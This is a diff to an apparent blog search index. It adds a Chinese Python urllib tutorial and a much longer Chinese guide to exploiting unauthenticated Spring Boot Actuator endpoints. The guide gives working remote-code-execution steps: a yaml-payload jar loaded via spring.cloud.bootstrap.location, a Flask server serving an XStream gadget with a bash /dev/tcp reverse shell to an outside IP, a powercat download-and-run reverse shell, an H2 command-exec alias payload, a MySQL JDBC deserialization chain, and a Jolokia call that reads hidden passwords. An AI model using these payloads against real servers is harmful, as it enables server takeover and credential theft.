@@ -31,6 +31,93 @@
       </tags>
   </entry>
   <entry>
+    <title>Python3-urllib</title>
+    <url>//e28b0e650137.html</url>
+    <content><![CDATA[<h1 id="urllib库"><a href="#urllib库" class="headerlink" title="urllib库"></a>urllib库</h1><h2 id="request"><a href="#request" class="headerlink" title="request"></a>request</h2><h3 id="urlopen"><a href="#urlopen" class="headerlink" title="urlopen"></a>urlopen</h3><p><code>urllib.request.urlope()</code>参数用于对目标<code>URL</code>的访问</p>
+<p>语法：</p>
+<p><strong>urllib.request.urlopen(url, data=None, [timeout, ]*, cafile=None, capath=None, cadefault=False, context=None)</strong></p>
+<ul>
+<li><p><strong>url</strong>: 目标资源在网络中的位置，可以是一个表示URL的字符串，也可以是一个<code>urllib.request</code>对象</p>
+</li>
+<li><p><strong>data</strong>: 用来指明发送服务器请求中的额外的参数信息，data默认是<code>None</code>,当给出<code>data</code>参数时,传参变成<code>POST</code></p>
+</li>
+<li><p><code>data</code>必须是<code>bytes</code>（字节流）类型，如果是字典，可以用<code>urllib.parse</code>模块里的<code>urlencode()</code>编码</p>
+</li>
+<li><p><strong>timeout</strong>: 设置网站的访问超时时间，仅适用于HTTP，HTTPS和FTP连接</p>
+</li>
+<li><p><strong>context</strong>: 实现SSL加密传输，必须是<code>ssl.SSLContext</code>类型</p>
+</li>
+<li><p><strong>cafile</strong>: 指定CA证书</p>
+</li>
+<li><p><strong>capath</strong>: 指定CA证书的路径</p>
+</li>
+<li><p><strong>cadefault</strong>: 已经废弃，默认为<code>False</code></p>
+</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://httpbin.org/post&#x27;</span></span><br><span class="line"><span class="built_in">dict</span> = &#123;<span class="number">1</span>:<span class="string">&#x27;A&#x27;</span>&#125;</span><br><span class="line">data = <span class="built_in">bytes</span>(urllib.parse.urlencode(<span class="built_in">dict</span>),encoding = <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">response = urllib.request.urlopen(url,data=data,timeout=<span class="number">6</span>)</span><br><span class="line"><span class="built_in">print</span>(response.read().decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="request-1"><a href="#request-1" class="headerlink" title="request"></a>request</h3><p><code>urllib.request.Request</code>用于构建一个请求</p>
+<p>语法：</p>
+<p><strong>urllib.request.Request(url, data=None, headers={}, origin_req_host=None, unverifiable=False, method=None)</strong></p>
+<ul>
+<li><p><strong>url</strong>: 目标资源在网络中的位置，可以是一个表示URL的字符串，也可以是一个<code>urllib.request</code>对象</p>
+</li>
+<li><p><strong>data</strong>: 用来指明发送服务器请求中的额外的参数信息，data默认是<code>None</code>,<code>data</code>必须是<code>bytes</code>（字节流）类型，如果是字典，可以用<code>urllib.parse</code>模块里的<code>urlencode()</code>编码</p>
+</li>
+<li><p><strong>headers</strong>: 用来构造请求头，也可以通过请求实例的<code>add_header()</code>方法添加</p>
+</li>
+<li><p><strong>method</strong>: 指定请求使用的方法</p>
+</li>
+<li><p><strong>origin_req_host</strong>: 指定请求方的host名称或者是IP地址</p>
+</li>
+<li><p><strong>unverifiable</strong>: 设置网页是否需要验证，默认是<code>False</code></p>
+</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://httpbin.org/post&#x27;</span></span><br><span class="line">headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;httpbin.org&#x27;</span>&#125;</span><br><span class="line"><span class="built_in">dict</span> = &#123;<span class="number">1</span>:<span class="string">&#x27;A&#x27;</span>&#125;</span><br><span class="line">data = <span class="built_in">bytes</span>(urllib.parse.urlencode(<span class="built_in">dict</span>),encoding = <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">req = urllib.request.Request(url=url,data=data,headers=headers,method=<span class="string">&#x27;POST&#x27;</span>)</span><br><span class="line"><span class="comment"># 这里也可以使用 add_header 添加headers</span></span><br><span class="line"><span class="comment"># req = urllib.request.Request(url=url,data=data,method=&#x27;POST&#x27;)</span></span><br><span class="line"><span class="comment"># req.add_header(&#x27;User-Agent&#x27;,&#x27;Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)&#x27;)</span></span><br><span class="line"><span class="comment"># req.add_header(&#x27;Host&#x27;,&#x27;httpbin.org&#x27;)</span></span><br><span class="line">response = urllib.request.urlopen(req)</span><br><span class="line"><span class="built_in">print</span>(response.read().decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="BaseHandler"><a href="#BaseHandler" class="headerlink" title="BaseHandler"></a>BaseHandler</h3><p><code>urllib.request.BaseHandler</code>用来构造Request的一些高级特性</p>
+<h2 id="response"><a href="#response" class="headerlink" title="response"></a>response</h2><p>urlopen返回对象提供方法：</p>
+<p>read() , readline() ,readlines() , fileno() , close() ：对HTTPResponse类型数据进行操作</p>
+<p>info()：返回HTTPMessage对象，表示远程服务器返回的头信息</p>
+<p>getcode()：返回Http状态码。如果是http请求，200请求成功完成;404网址未找到</p>
+<p>geturl()：返回请求的url</p>
+<h2 id="parse"><a href="#parse" class="headerlink" title="parse"></a>parse</h2><h3 id="urlparse"><a href="#urlparse" class="headerlink" title="urlparse"></a>urlparse</h3><p><code>urllib.parse.urlparse</code>用于解析URL</p>
+<p>语法：</p>
+<p><strong>urllib.parse.urlparse(urlstring, scheme=’’, allow_fragments=True)</strong></p>
+<ul>
+<li><strong>urlstring</strong>: 表示字符串的url地址</li>
+<li><strong>scheme</strong>: 表示协议类型</li>
+<li><strong>allow_fragments</strong>: 默认为<code>True</code>，如果为<code>False</code>则无法识别片段标识符，返回<code>fragment=&#39;&#39;</code></li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">key = <span class="string">&#x27;http://python.org/学习/index?a=1&#x27;</span></span><br><span class="line">Result = urllib.parse.urlparse(key)</span><br><span class="line"><span class="built_in">print</span>(Result)</span><br><span class="line"></span><br><span class="line">ParseResult(scheme=<span class="string">&#x27;http&#x27;</span>, netloc=<span class="string">&#x27;python.org&#x27;</span>, path=<span class="string">&#x27;/学习/index&#x27;</span>, params=<span class="string">&#x27;&#x27;</span>, query=<span class="string">&#x27;a=1&#x27;</span>, fragment=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># 其中scheme是协议，netloc是域名，path是路径，params是参数，query是查询的条件，fragment是片段</span></span><br><span class="line"><span class="comment"># 也可以单独输出</span></span><br><span class="line"><span class="built_in">print</span>(Result.scheme)</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="quote"><a href="#quote" class="headerlink" title="quote"></a>quote</h3><p>对URL进行编码</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">key = <span class="string">&#x27;http://python.org/学习&#x27;</span></span><br><span class="line">key1 = urllib.parse.quote(key)</span><br><span class="line"><span class="built_in">print</span>(key1)</span><br><span class="line"></span><br><span class="line">http%3A//python.org/%E5%AD%A6%E4%B9%A0</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="unquote"><a href="#unquote" class="headerlink" title="unquote"></a>unquote</h3><p>对URL进行解码</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">key = <span class="string">&#x27;http://python.org/学习&#x27;</span></span><br><span class="line">key1 = urllib.parse.quote(key)</span><br><span class="line">key2 = urllib.parse.unquote(key1)</span><br><span class="line"><span class="built_in">print</span>(key2)</span><br><span class="line"></span><br><span class="line">http://python.org/学习</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="robotparser"><a href="#robotparser" class="headerlink" title="robotparser"></a>robotparser</h2><h2 id="error"><a href="#error" class="headerlink" title="error"></a>error</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">try:</span><br><span class="line">    urllib.request.urlopen(url)</span><br><span class="line">except urllib.error.URLError as e:</span><br><span class="line">    print(e.reason)</span><br><span class="line">    print(e.status)</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>Python3</category>
+      </categories>
+      <tags>
+        <tag>Python库</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>SQL注入漏洞</title>
     <url>//9958bd672d7e.html</url>
     <content><![CDATA[<h2 id="SQL注入漏洞简介"><a href="#SQL注入漏洞简介" class="headerlink" title="SQL注入漏洞简介"></a>SQL注入漏洞简介</h2><p>​        SQL 注入（SQL Injection）是发生在 Web 程序中数据库层的安全漏洞，是网站存在最多也是最简单的漏洞。主要原因是程序对用户输入数据的合法性没有判断和处理，导致攻击者可以在 Web 应用程序中事先定义好的 SQL 语句中添加额外的 SQL 语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步获取到数据信息。</p>
@@ -170,6 +257,98 @@
     <title>Spring Boot Autuator未授权访问</title>
     <url>//10d5c6245bbe.html</url>
     <content><![CDATA[<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>​        Actuator 是 Spring Boot 提供的服务监控和管理中间件。当 Spring Boot 应用程序运行时，它会自动将多个端点注册到路由进程中。默认配置会出现接口未授权访问，部分接口会泄露网站流量信息和内存信息等，使用Jolokia库特性甚至可以远程执行任意代码，获取服务器权限</p>
+<p>Spring Cloud 是基于 Spring Boot 来进行构建服务，并提供如配置管理、服务注册与发现、智能路由等常见功能的帮助快速开发分布式系统的系列框架的有序集合</p>
+<p>组件版本的相互依赖关系：</p>
+<table>
+<thead>
+<tr>
+<th align="center">依赖项</th>
+<th align="center">版本列表及依赖组件版本</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">spring-boot-starter-parent</td>
+<td align="center"><a href="https://mvnrepository.com/artifact/org.springframework.boot/spring-boot-starter-parent">spring-boot-starter-parent</a></td>
+</tr>
+<tr>
+<td align="center">spring-boot-dependencies</td>
+<td align="center"><a href="https://mvnrepository.com/artifact/org.springframework.boot/spring-boot-dependencies">spring-boot-dependencies</a></td>
+</tr>
+<tr>
+<td align="center">spring-cloud-dependencies</td>
+<td align="center"><a href="https://mvnrepository.com/artifact/org.springframework.cloud/spring-cloud-dependencies">spring-cloud-dependencies</a></td>
+</tr>
+</tbody></table>
+<p>Spring Cloud 与 Spring Boot 版本之间的依赖关系：</p>
+<table>
+<thead>
+<tr>
+<th align="center">Spring Cloud 大版本</th>
+<th align="center">Spring Boot 版本</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">Angel</td>
+<td align="center">兼容 Spring Boot 1.2.x</td>
+</tr>
+<tr>
+<td align="center">Brixton</td>
+<td align="center">兼容 Spring Boot 1.3.x、1.4.x</td>
+</tr>
+<tr>
+<td align="center">Camden</td>
+<td align="center">兼容 Spring Boot 1.4.x、1.5.x</td>
+</tr>
+<tr>
+<td align="center">Dalston</td>
+<td align="center">兼容 Spring Boot 1.5.x，不兼容 2.0.x</td>
+</tr>
+<tr>
+<td align="center">Edgware</td>
+<td align="center">兼容 Spring Boot 1.5.x，不兼容 2.0.x</td>
+</tr>
+<tr>
+<td align="center">Finchley</td>
+<td align="center">兼容 Spring Boot 2.0.x，不兼容 1.5.x</td>
+</tr>
+<tr>
+<td align="center">Greenwich</td>
+<td align="center">兼容 Spring Boot 2.1.x</td>
+</tr>
+<tr>
+<td align="center">Hoxton</td>
+<td align="center">兼容 Spring Boot 2.2.x</td>
+</tr>
+</tbody></table>
+<p>Spring Cloud 小版本号的后缀及含义:</p>
+<table>
+<thead>
+<tr>
+<th align="center">小版本号后缀</th>
+<th align="center">含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">BUILD-SNAPSHOT</td>
+<td align="center">快照版，代码不是固定，处于变化之中</td>
+</tr>
+<tr>
+<td align="center">MX</td>
+<td align="center">里程碑版</td>
+</tr>
+<tr>
+<td align="center">RCX</td>
+<td align="center">候选发布版</td>
+</tr>
+<tr>
+<td align="center">RELEASE</td>
+<td align="center">正式发布版</td>
+</tr>
+<tr>
+<td align="center">SRX</td>
+<td align="center">(修复错误和 bug 并再次发布的)正式发布版</td>
+</tr>
+</tbody></table>
 <h3 id="服务特征"><a href="#服务特征" class="headerlink" title="服务特征"></a>服务特征</h3><p><strong>Spring Boot</strong></p>
 <p>1.网站图片是一个绿色的树叶</p>
 <p>2.报错信息</p>
@@ -186,11 +365,162 @@
 <h3 id="shutdown"><a href="#shutdown" class="headerlink" title="/shutdown"></a>/shutdown</h3><p>导致应用关闭，影响业务正常运行</p>
 <h3 id="env"><a href="#env" class="headerlink" title="/env"></a>/env</h3><p>环境信息泄露，可能存在数据库账号密码</p>
 <p>存在软件的版本信息和绝对路径</p>
+<p>查看是否存在常见的反序列化 gadget 依赖，比如 commons-collections、 Jdk7u21、 Jdk8u20 等</p>
+<h4 id="spring-Cloud-env"><a href="#spring-Cloud-env" class="headerlink" title="spring Cloud env"></a>spring Cloud env</h4><p>当spring boot使用Spring Cloud 相关组件时，会存在spring.cloud.bootstrap.location属性，通过修改 spring.cloud.bootstrap.location 环境变量实现 RCE</p>
+<p><strong>利用范围</strong></p>
+<ul>
+<li>Spring Boot 2.x 无法利用成功</li>
+<li>Spring Boot 1.5.x 在使用 Dalston 版本时可利用成功，使用 Edgware 无法成功</li>
+<li>Spring Boot &lt;= 1.4 可利用成功</li>
+</ul>
+<p>下载EXP</p>
+<p><a href="https://github.com/artsploit/yaml-payload">https://github.com/artsploit/yaml-payload</a></p>
+<p>将下载后的文件编译,然后把生成的jar文件上传到公网web服务器</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">javac src/artsploit/AwesomeScriptEngineFactory.java</span><br><span class="line">jar -cvf yaml-payload.jar -C src/ .</span><br></pre></td></tr></table></figure>
+
+<p>利用 /env endpoint 修改 spring.cloud.bootstrap.location 属性值为外部 yml 配置文件 url 地址</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/env</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8090</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>59</span><br><span class="line"> </span><br><span class="line">spring.cloud.bootstrap.location=http://x.x.x.x/yaml-payload.yml</span><br></pre></td></tr></table></figure>
+
+<p>在通过/refresh 接口触发</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/refresh</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8090</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>0</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="XStream反序列化"><a href="#XStream反序列化" class="headerlink" title="XStream反序列化"></a>XStream反序列化</h4><p>影响范围</p>
+<ul>
+<li>Eureka-Client &lt;1.8.7</li>
+</ul>
+<p>查看/env端点是否存在<code>eureka.client.serviceUrl.defaultZone</code>属性</p>
+<p>通过/env将<code>eureka.client.serviceUrl.defaultZone</code>属性设置为服务器URL，然后调用/refresh端点</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># linux反弹shell bash -i &gt;&amp;amp; /dev/tcp/192.168.20.82/9999 0&gt;&amp;amp;1</span></span><br><span class="line"><span class="comment"># windows反弹shell</span></span><br><span class="line"><span class="comment"># &lt;string&gt;powershell&lt;/string&gt;</span></span><br><span class="line"><span class="comment"># &lt;string&gt;IEX (New-Object System.Net.Webclient).DownloadString(&#x27;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#x27;);&lt;/string&gt;</span></span><br><span class="line"><span class="comment"># &lt;string&gt;powercat -c 192.168.123.1 -p 2333 -e cmd&lt;/string&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Response</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, defaults=&#123;<span class="string">&#x27;path&#x27;</span>: <span class="string">&#x27;&#x27;</span>&#125;</span>)</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&lt;path:path&gt;&#x27;</span>, methods = [<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">catch_all</span>(<span class="params">path</span>):</span></span><br><span class="line">    xml = <span class="string">&quot;&quot;&quot;&lt;linked-hash-set&gt;</span></span><br><span class="line"><span class="string">  &lt;jdk.nashorn.internal.objects.NativeString&gt;</span></span><br><span class="line"><span class="string">    &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt;</span></span><br><span class="line"><span class="string">      &lt;dataHandler&gt;</span></span><br><span class="line"><span class="string">        &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt;</span></span><br><span class="line"><span class="string">          &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt;</span></span><br><span class="line"><span class="string">              &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span></span><br><span class="line"><span class="string">                  &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt;</span></span><br><span class="line"><span class="string">                  &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;command&gt;</span></span><br><span class="line"><span class="string">                                &lt;string&gt;/bin/bash&lt;/string&gt;</span></span><br><span class="line"><span class="string">                      &lt;string&gt;-c&lt;/string&gt;</span></span><br><span class="line"><span class="string">                      &lt;string&gt;bash -i &gt;&amp;amp; /dev/tcp/88.88.88.88/3333 0&gt;&amp;amp;1&lt;/string&gt;</span></span><br><span class="line"><span class="string">                    &lt;/command&gt;</span></span><br><span class="line"><span class="string">                    &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt;</span></span><br><span class="line"><span class="string">                  &lt;/next&gt;</span></span><br><span class="line"><span class="string">                &lt;/iter&gt;</span></span><br><span class="line"><span class="string">                &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt;</span></span><br><span class="line"><span class="string">                  &lt;method&gt;</span></span><br><span class="line"><span class="string">                    &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;</span></span><br><span class="line"><span class="string">                    &lt;name&gt;start&lt;/name&gt;</span></span><br><span class="line"><span class="string">                    &lt;parameter-types/&gt;</span></span><br><span class="line"><span class="string">                  &lt;/method&gt;</span></span><br><span class="line"><span class="string">                  &lt;name&gt;foo&lt;/name&gt;</span></span><br><span class="line"><span class="string">                &lt;/filter&gt;</span></span><br><span class="line"><span class="string">                &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt;</span></span><br><span class="line"><span class="string">              &lt;/serviceIterator&gt;</span></span><br><span class="line"><span class="string">              &lt;lock/&gt;</span></span><br><span class="line"><span class="string">            &lt;/cipher&gt;</span></span><br><span class="line"><span class="string">            &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt;</span></span><br><span class="line"><span class="string">            &lt;ibuffer&gt;&lt;/ibuffer&gt;</span></span><br><span class="line"><span class="string">          &lt;/is&gt;</span></span><br><span class="line"><span class="string">        &lt;/dataSource&gt;</span></span><br><span class="line"><span class="string">      &lt;/dataHandler&gt;</span></span><br><span class="line"><span class="string">    &lt;/value&gt;</span></span><br><span class="line"><span class="string">  &lt;/jdk.nashorn.internal.objects.NativeString&gt;</span></span><br><span class="line"><span class="string">&lt;/linked-hash-set&gt;&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> Response(xml, mimetype=<span class="string">&#x27;application/xml&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">2222</span>)</span><br></pre></td></tr></table></figure>
+
+<p>使用python在公网web服务器执行以上代码</p>
+<p>spring 1.x（一定要指定内容类型，不能有其他类型）</p>
+<figure class="highlight dart"><table><tr><td class="code"><pre><span class="line">POST /refresh</span><br><span class="line">Content-<span class="built_in">Type</span>: application/x-www-form-urlencoded</span><br></pre></td></tr></table></figure>
+
+<p>spring 2.x</p>
+<figure class="highlight dart"><table><tr><td class="code"><pre><span class="line">POST /actuator/refresh</span><br><span class="line">Content-<span class="built_in">Type</span>: application/json</span><br></pre></td></tr></table></figure>
+
+
+
+<p>通过/env端点设置<code>eureka.client.serviceUrl.defaultZone</code>属性</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/env</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8090</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>50</span><br><span class="line"> </span><br><span class="line">eureka.client.serviceUrl.defaultZone=http://x.x.x.x/xstream</span><br></pre></td></tr></table></figure>
+
+<p>访问/refresh端点刷新配置</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/refresh</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8090</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>0</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="H2-REC"><a href="#H2-REC" class="headerlink" title="H2 REC"></a>H2 REC</h4><p>影响版本</p>
+<ul>
+<li>Spring Boot 2.x版本</li>
+</ul>
+<p>发送POST包配置<code>spring.datasource.hikari.connection-test-query</code>的值</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/actuator/env</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>xx.xx.xx.xx:8080</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>365</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">&quot;name&quot;:&quot;spring.datasource.hikari.connection-test-query&quot;,&quot;value&quot;:&quot;CREATE ALIAS EXEC AS &#x27;String shellexec(String cmd) throws java.io.IOException &#123; java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()); if (s.hasNext()) &#123;return s.next();&#125; throw new IllegalArgumentException();&#125;&#x27;; CALL EXEC(&#x27;ipconfig&amp;&amp;ifconfig&#x27;);&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>访问/refresh端点刷新配置</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/actuator/restart</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>xx.xx.xx.xx:8080</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="MySQL-jdbc-反序列化"><a href="#MySQL-jdbc-反序列化" class="headerlink" title="MySQL jdbc 反序列化"></a>MySQL jdbc 反序列化</h4><p>1.查看环境依赖</p>
+<p>在<code>/env</code>端点中查找<code>mysql-connector-java</code>依赖,并查看版本号（5.x或者8.x）</p>
+<p>搜索 <code>spring.datasource.url</code> 关键词，记录下其 value 值，方便后续恢复其正常 jdbc url 值</p>
+<p>2.在公网web服务器上运行python脚本</p>
+<p><a href="https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-jdbc-deserialization-rce.py">https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-jdbc-deserialization-rce.py</a></p>
+<p>利用ysoserial生成 payload.ser 反序列化 payload 文件，供脚本使用</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsCollections3 calc &gt; payload.ser</span><br></pre></td></tr></table></figure>
+
+<p>3.设置 <code>spring.datasource.url</code> 属性</p>
+<p>根据 /env 接口暴露的属性名 spring.datasource.url ，和实际的 mysql-connector-java 版本，设置 jdbc url</p>
+<p>mysql-connector-java 5.x</p>
+<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="symbol">jdbc:</span><span class="symbol">mysql:</span>/<span class="regexp">/xx.xx.xx.xx:3306/mysql</span>?characterEncoding=utf8&amp;useSSL=<span class="literal">false</span>&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=<span class="literal">true</span></span><br></pre></td></tr></table></figure>
+
+<p>mysql-connector-java 8.x</p>
+<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="symbol">jdbc:</span><span class="symbol">mysql:</span>/<span class="regexp">/xx.xx.xx.xx:3306/mysql</span>?characterEncoding=utf8&amp;useSSL=<span class="literal">false</span>&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=<span class="literal">true</span></span><br></pre></td></tr></table></figure>
+
+<p>spring boot 1.x</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">POST /env</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">spring.datasource.url=对应属性值</span><br></pre></td></tr></table></figure>
+
+<p>spring boot 2.x</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;spring.datasource.url&quot;,&quot;value&quot;:&quot;对应属性值&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>4.访问/refresh端点刷新配置</p>
+<p>spring boot 1.x</p>
+<figure class="highlight dart"><table><tr><td class="code"><pre><span class="line">POST /refresh</span><br><span class="line">Content-<span class="built_in">Type</span>: application/x-www-form-urlencoded</span><br></pre></td></tr></table></figure>
+
+<p>spring boot 2.x</p>
+<figure class="highlight dart"><table><tr><td class="code"><pre><span class="line">POST /actuator/refresh</span><br><span class="line">Content-<span class="built_in">Type</span>: application/json</span><br></pre></td></tr></table></figure>
+
+<p>5.触发数据查询，即可触发反序列化漏洞，反序列化漏洞利用完成后,恢复 <code>spring.datasource.url</code> 的原始 value 值</p>
 <h3 id="mappings"><a href="#mappings" class="headerlink" title="/mappings"></a>/mappings</h3><p>获取应用所有接口列表，可能导致接口被恶意攻击，影响接口正常使用</p>
 <p>可能存在未授权接口</p>
 <h3 id="trace"><a href="#trace" class="headerlink" title="/trace"></a>/trace</h3><p>获取认证信息（Cookie、tooken、Session），利用认证信息访问接口，比如伪造cookie登录</p>
-<h3 id="jolokia-list"><a href="#jolokia-list" class="headerlink" title="/jolokia/list"></a>/jolokia/list</h3><p>可能存在logback 库提供的reloadByURL方法</p>
+<h3 id="jolokia-list"><a href="#jolokia-list" class="headerlink" title="/jolokia/list"></a>/jolokia/list</h3><h4 id="调用-org-springframework-bootMbean"><a href="#调用-org-springframework-bootMbean" class="headerlink" title="调用 org.springframework.bootMbean"></a>调用 org.springframework.bootMbean</h4><p>通过<code>org.springframework.bootMbean</code>获取/env中被隐藏的账号密码</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;jolokia</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line"></span><br><span class="line">&#123;&quot;mbean&quot;: &quot;org.springframework.boot:name&#x3D;SpringApplication,type&#x3D;Admin&quot;,&quot;operation&quot;: &quot;getProperty&quot;, &quot;type&quot;: &quot;EXEC&quot;, &quot;arguments&quot;: [&quot;security.user.password&quot;]&#125;</span><br></pre></td></tr></table></figure>
+
+
+
